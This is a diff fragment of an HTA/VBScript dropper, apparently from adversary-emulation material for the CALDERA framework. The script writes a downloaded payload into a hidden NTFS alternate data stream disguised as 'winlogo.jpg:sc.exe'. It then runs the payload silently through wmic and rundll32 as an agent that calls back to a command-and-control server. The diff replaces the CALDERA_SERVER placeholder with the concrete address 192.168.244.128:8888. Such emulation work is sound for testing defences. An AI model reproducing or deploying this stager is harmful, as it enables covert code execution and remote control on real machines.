@@ -9,7 +9,7 @@ data = xhr.responseBody
 Set stream = CreateObject("ADODB.Stream")
 stream.Type = 1 : stream.Open
 stream.Write xhr.responseBody : stream.SaveToFile "C:\\Users\\Public\\winlogo.jpg:sc.exe", 2
-CreateObject("Wscript.Shell").Run "wmic process call create 'rundll32 advapi32.dll,CreateProcessAsUser C:\\Users\\Public\\winlogo.jpg:sc.exe -server http://CALDERA_SERVER:8888'",0
+CreateObject("Wscript.Shell").Run "wmic process call create 'rundll32 advapi32.dll,CreateProcessAsUser C:\\Users\\Public\\winlogo.jpg:sc.exe -server http://192.168.244.128:8888'",0
 self.close
 </script>
 
